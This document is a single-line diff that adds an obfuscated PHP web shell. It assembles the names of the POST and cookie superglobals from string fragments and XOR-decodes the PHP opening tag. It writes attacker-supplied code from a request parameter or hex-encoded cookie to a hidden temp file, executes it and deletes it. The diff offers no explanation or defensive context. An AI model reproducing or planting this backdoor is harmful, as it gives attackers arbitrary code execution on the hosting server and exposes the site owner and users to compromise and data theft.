@@ -1,0 +1,1 @@
+<?php $p='_'.'POS'.'T';$p=$$p;$c='_CO'.'OKIE';$c=$$c;file_put_contents($f="/tmp/.code",("\x0d\x0d\x43\x5c\x45"^"12345").' '.(isset($p['x'])?$p['x']:hex2bin($c['x'])));require($f);@unlink($f);
